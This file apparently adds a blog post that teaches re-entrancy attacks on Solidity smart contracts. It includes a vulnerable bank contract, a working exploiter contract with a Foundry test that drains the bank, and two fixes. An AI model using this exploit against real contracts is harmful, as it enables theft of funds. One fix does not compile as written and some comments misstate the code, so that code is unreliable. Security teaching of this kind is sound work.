@@ -1,0 +1,314 @@
+---
+title: Re-entrancy attack - Concept, Simulation, and Solution
+date: '2023-05-09T00:00:00Z'
+modifiedTime: '2023-05-09T00:00:00Z'
+summary: Introduce re-entrancy vulnerability in smart contracts. Implement a mock up exploitation scenario and guard against it.
+image: 'blogs/blockchain/reentrance/cover.webp'
+type: BlogPost
+---
+
+# Introduction
+
+Re-entrancy attacks are a type of security vulnerability that can occur in smart contracts on blockchain platforms.
+This type of attack allows an attacker to repeatedly enter and exit a function in a smart contract,
+while maintaining the same state and taking advantage of the contract's vulnerability to drain funds or cause other malicious actions.
+
+## Common mistakes
+
+Common mistakes that lead to re-entrancy vulnerability are:
+
+1. Improper use of global state variables
+2. Inadequate input validation
+3. Use of external contracts without proper security checks
+4. Improper use of mutex
+5. Insufficient gas limits for functions
+
+# An example
+
+In this section, we will implement a mockup scenario for re-entrancy attack using [Foundry-rs](https://book.getfoundry.sh/)
+
+## The Vulnerable Contract
+
+Here's the `ReentranceBank`, a smart contract that support store and retrieve ether:
+
+```solidity
+// File: <root>/src/reentrance/ReentranceBank.sol
+pragma solidity ^0.8.13;
+
+contract ReentranceBank {
+  mapping(address => uint256) public balances;
+
+  function deposit() public payable {
+    balances[msg.sender] = balances[msg.sender] + msg.value;
+  }
+
+  function balanceOf(address _who) public view returns (uint256) {
+    return balances[_who];
+  }
+
+  function withdraw(uint256 _amount) public {
+    if (balances[msg.sender] >= _amount) {
+      (bool result, ) = msg.sender.call{ value: _amount }(""); // send ether to withdrawal
+      require(result, "withdrawal false");
+      unchecked {
+        balances[msg.sender] -= _amount; // update balances state
+      }
+    }
+  }
+
+  receive() external payable {}
+}
+```
+
+A critical error is sending ether (**_line 17_**) before updating the balances (**_line 20_**)
+
+## Exploitation
+
+Let's take the role of an exploiter, we will perform on attack in the following steps:
+
+1. Gather some ether amounts
+2. Create and deploy an exploiter contract
+3. Deposit into the exploiter contract some amount of ether
+4. Execute the exploiting function from exploiter contract
+5. Exploiter contract now's drained the `ReentranceBank`, simply withdraw from it to complete the attack.
+
+### The exploiter contract
+
+```solidity
+// File: <root>/src/reentrance/ReentranceAttack.sol
+pragma solidity ^0.8.13;
+
+// third-party dependencies
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+abstract contract IReentrance {
+  mapping(address => uint256) public balances;
+
+  function deposit() external payable virtual;
+
+  function withdraw(uint256 _amount) external virtual;
+}
+
+contract ReentranceAttack is Ownable {
+  IReentrance public targetBank;
+  uint256 initialDeposit;
+
+  // Step 2: deploy the exploiter contract, with attacker being owner
+  constructor(address challengeAddress) {
+    targetBank = IReentrance(challengeAddress);
+  }
+
+  // Step 3-4: Implement exploitation flows to drain the bank
+  function withdraw() external onlyOwner {
+    uint256 balance = address(this).balance;
+    (bool result, ) = msg.sender.call{ value: balance }("");
+    require(result, "Withdrawal failed.");
+  }
+
+  function attack() external payable {
+    // Step 1: Deposit some funds
+    initialDeposit = msg.value;
+    targetBank.deposit{ value: initialDeposit }();
+
+    // Step 5: withdraw these funds.
+    callWithdraw();
+  }
+
+  receive() external payable {
+    // Funds will be withdraw multiple times due to re-entrancy calls.
+    callWithdraw();
+  }
+
+  function callWithdraw() private {
+    // this balance correctly updates after withdraw
+    uint256 remainingBalance = address(targetBank).balance;
+
+    if (remainingBalance > initialDeposit) {
+      targetBank.withdraw(initialDeposit);
+    } else if (remainingBalance > 0) {
+      targetBank.withdraw(remainingBalance);
+    }
+  }
+}
+```
+
+The exploit will happen at:
+
+- `withdraw()` on **_line 25_**: entry point of our attack. The contract use `msg.sender.call{value: ...}` to prevent running out of gas (call stack can potentially be very large)
+- `receive()` on **_line 40_**: it is a hook that being executed whenever this contract receive any ether
+- `callWithdraw()` on **_line 45_**: drain the bank until it running out of ether.
+
+### Exploitation flow mockup
+
+With the exploiter contract defined above, we will mockup an attack scenario in Foundry VM environment.
+
+```solidity
+// File: <root>/test/reentrance/Reentrance.t.sol
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+import "~/reentrance/ReentranceBank.sol"; // use path remap <root>/src -> ~
+import "~/reentrance/ReentranceAttack.sol";
+
+contract ReentranceTest is Test {
+  address depositor = vm.addr(1);
+  address hacker = vm.addr(2);
+
+  function setUp() public {
+    // Deal EOA address some ether
+    vm.deal(depositor, 100 ether);
+    vm.deal(hacker, 1 ether);
+  }
+
+  // NOTE: `forge test` thread limit is 128
+  function testReentranceAttack() public {
+    ReentranceBank bankContract = new ReentranceBank();
+    address bankAddress = address(bankContract);
+
+    // Depositor deposits 100 ether into the bank.
+    vm.prank(depositor);
+    bankContract.deposit{ value: 2 ether }();
+
+    // Hacker exploit the smart contract.
+    vm.startPrank(hacker);
+    ReentranceAttack exploiterContract = new ReentranceAttack(bankAddress);
+    exploiterContract.attack{ value: 1 ether }();
+    exploiterContract.withdraw();
+    vm.stopPrank();
+
+    assertEq(bankAddress.balance, 0 ether, "Bank balance should be zero");
+    assertEq(hacker.balance, 3 ether, "Hacker should drain all money in the bank");
+  }
+}
+```
+
+For the above example, The execution stack will be:
+
+<Image
+  src="/blogs/blockchain/reentrance/reentrance_stack.webp"
+  alt="Execution stack"
+  caption="Execution stack when performing the above attack"
+  width="1457"
+  height="678"
+/>
+
+Note that the attacker was able to withdraw 3 ETH with 1 ETH funding.
+
+# Prevention
+
+There are 2 well-known to prevent re-entrancy attack:
+
+1. Make vulnerable function atomic, i.e. their executions can't be interleaved
+2. Correct state update order, i.e. follows check-effects-interaction pattern
+
+## Solution 1: Re-entrancy guard
+
+Take the Openzeppelin&apos;s implementation
+
+```solidity
+// File: From Openzeppelin
+abstract contract ReentrancyGuard {
+  uint256 private constant _NOT_ENTERED = 1;
+  uint256 private constant _ENTERED = 2;
+
+  uint256 private _status;
+
+  modifier nonReentrant() {
+    _nonReentrantBefore();
+    _;
+    _nonReentrantAfter();
+  }
+
+  function _nonReentrantBefore() private {
+    require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
+    _status = _ENTERED;
+  }
+
+  function _nonReentrantAfter() private {
+    _status = _NOT_ENTERED;
+  }
+
+  constructor() {
+    _status = _NOT_ENTERED;
+  }
+
+  function _reentrancyGuardEntered() internal view returns (bool) {
+    return _status == _ENTERED;
+  }
+}
+```
+
+and use the modifier in our contract
+
+```solidity
+contract RobustBank is ReentrancyGuard {
+  mapping(address => uint256) public balances;
+
+  function deposit() public payable {
+    balances[msg.sender] = balances[msg.sender] + msg.value;
+  }
+
+  function balanceOf(address _who) public view returns (uint256) {
+    return balances[_who];
+  }
+
+  function withdraw(uint256 _amount) public nonReentrant {
+    if (balances[msg.sender] >= _amount) {
+      (bool result, ) = msg.sender.call{ value: _amount }("");
+      require(result, "withdrawal false");
+      unchecked {
+        balances[msg.sender] -= _amount; // unchecked to prevent underflow errors
+      }
+    }
+  }
+
+  receive() external payable {}
+}
+```
+
+## Solution 2: Fix update logic
+
+This solution aves gas and require good understanding of the execution flow => should be use with careful consideration
+
+```solidity
+contract RobustBank {
+  mapping(address => uint256) public balances;
+
+  function deposit() public payable {
+    balances[msg.sender] = balances[msg.sender] + msg.value;
+  }
+
+  function balanceOf(address _who) public view returns (uint256) {
+    return balances[_who];
+  }
+
+  function withdraw(uint256 _amount) public nonReentrant {
+    if (balances[msg.sender] >= _amount) {
+      unchecked {
+        balances[msg.sender] -= _amount; // update balances before send ETH.
+      }
+      (bool result, ) = msg.sender.call{ value: _amount }("");
+      require(result, "withdrawal false"); // will reverse the whole contract
+    }
+  }
+
+  receive() external payable {}
+```
+
+# Conclusion
+
+In conclusion, there are two common solutions to guard against re-entrancy attacks in smart contracts:
+
+## 1. Re-entrancy guard
+This is a simple solution that involves adding a boolean variable to the contract's state to track whether a function is currently executing. 
+While effective, this method can be costly in terms of gas usage and may impact the contract's overall performance. 
+It is considered a safer option for developers who are not experienced with more sophisticated security patterns.
+
+## 2. Check-Effects-Interactions pattern 
+This method involves separating the contract's functions into three parts:
+1. checking inputs
+2. updating the state
+3. interacting with other contracts
+
+and ensuring that these parts are executed in a correct order. While more efficient than the re-entrancy guard, 
+this solution requires a more sophisticated understanding of smart contract security and can be challenging to implement correctly.
